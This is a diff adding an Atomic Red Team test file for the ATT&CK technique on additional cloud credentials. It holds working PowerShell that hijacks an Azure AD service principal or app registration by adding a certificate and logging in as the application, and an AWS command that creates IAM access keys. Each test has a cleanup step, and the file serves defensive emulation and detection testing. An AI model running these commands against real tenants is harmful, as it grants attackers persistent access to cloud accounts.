@@ -1,0 +1,199 @@
+attack_technique: T1098.001
+display_name: 'Account Manipulation: Additional Cloud Credentials'
+atomic_tests:
+- name: Azure AD Application Hijacking - Service Principal
+  auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
+  description: |
+    Add a certificate to an Application through its Service Principal.
+    The certificate can then be used to authenticate as the application and benefit from its rights.
+    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    username:
+      description: Azure AD username
+      type: String
+      default: jonh@contoso.com
+    password:
+      description: Azure AD password
+      type: String
+      default: p4sswd
+    service_principal_name:
+      description: Name of the targeted service principal
+      type: String
+      default: SuperSP
+    certificate_password:
+      description: Password of the new certificate
+      type: string
+      default: Passw0rd
+    path_to_cert:
+      description: Path of the new certificate, locally stored 
+      type: string
+      default: $env:TEMP
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AzureAD module must be installed.
+    prereq_command: |
+      if (Get-Module AzureAD) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureAD -Force
+  executor:
+    command: |
+      Import-Module -Name AzureAD
+      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+      Connect-AzureAD -Credential $Credential
+
+      $sp = Get-AzureADServicePrincipal -Searchstring "#{service_principal_name}"
+      if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
+      # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
+      $certNotAfter = (Get-Date).AddDays(2)
+      $credNotAfter = (Get-Date).AddDays(1)
+      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+      $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
+      Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{service_principal_name}.pfx" -Password $pwd
+
+      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{service_principal_name}.pfx", $pwd)
+      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+
+      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
+
+      Start-Sleep -s 30
+      $tenant=Get-AzureADTenantDetail
+      $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
+      Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
+      Write-Host "End of Hijacking"
+
+    cleanup_command: |
+      Import-Module -Name AzureAD
+      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+      Connect-AzureAD -Credential $Credential
+
+      $sp = Get-AzureADServicePrincipal -Searchstring "#{service_principal_name}"
+      $credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId
+      foreach ($cred in $credz) {
+        if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq "AtomicTest") {
+          Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId
+        }  
+      }
+      Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq "AtomicCert" } | Remove-Item
+      rm "#{path_to_cert}\#{service_principal_name}.pfx"
+      
+    name: powershell
+    elevation_required: false
+
+- name: Azure AD Application Hijacking - App Registration
+  auto_generated_guid: a12b5531-acab-4618-a470-0dafb294a87a
+  description: |
+    Add a certificate to an Application through its App Registration.
+    The certificate can then be used to authenticate as the application and benefit from its rights.
+    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    username:
+      description: Azure AD username
+      type: String
+      default: jonh@contoso.com
+    password:
+      description: Azure AD password
+      type: String
+      default: p4sswd
+    application_name:
+      description: Name of the targeted application 
+      type: String
+      default: SuperApp
+    certificate_password:
+      description: Password of the new certificate
+      type: string
+      default: Passw0rd
+    path_to_cert:
+      description: Path of the new certificate, locally stored 
+      type: string
+      default: $env:TEMP
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AzureAD module must be installed.
+    prereq_command: |
+      if (Get-Module AzureAD) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureAD -Force
+  executor:
+    command: |
+      Import-Module -Name AzureAD
+      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+      Connect-AzureAD -Credential $Credential
+
+      $app = Get-AzureADApplication -Searchstring "#{application_name}"
+      if ($app -eq $null) { Write-Warning "Application not found"; exit }
+      $certNotAfter = (Get-Date).AddDays(2)
+      $credNotAfter = (Get-Date).AddDays(1)
+      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+      $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
+      Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application_name}.pfx" -Password $pwd
+
+      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application_name}.pfx", $pwd)
+      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+
+      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
+
+      Start-Sleep -s 30
+      $tenant=Get-AzureADTenantDetail
+      $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
+      Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
+      Write-Host "End of Hijacking"
+
+    cleanup_command: |
+      Import-Module -Name AzureAD
+      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+      Connect-AzureAD -Credential $Credential
+
+      $app = Get-AzureADApplication -Searchstring "#{application_name}"
+      $credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId
+      foreach ($cred in $credz) {
+        if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq "AtomicTest") {
+          Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId
+        }  
+      }
+      Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq "AtomicCert" } | Remove-Item
+      rm "#{path_to_cert}\#{application_name}.pfx"
+
+    name: powershell
+    elevation_required: false
+    
+- name: AWS - Create Access Key and Secret Key
+  auto_generated_guid: 8822c3b0-d9f9-4daf-a043-491160a31122
+  description: |
+    Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised
+  supported_platforms:
+  - iaas:aws
+  input_arguments:
+    username:
+      description: Create new AWS access and secret keys for the user
+      type: String
+      default: "atomicredteam"
+  dependencies:
+    - description: |
+        Check if the user exists.
+      prereq_command: |
+        aws iam list-users | grep #{username}
+      get_prereq_command: |
+        echo Please run atomic test T1136.003, before running this atomic
+  executor:
+    command: |
+      aws iam create-access-key --user-name #{username} > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+      cd $PathToAtomicsFolder/T1098.001/bin/
+      ./aws_secret.sh
+    cleanup_command: |
+      access_key=`cat $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`
+      aws iam delete-access-key --access-key-id $access_key --user-name #{username}
+      rm $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+    name: sh
+    
+    
+
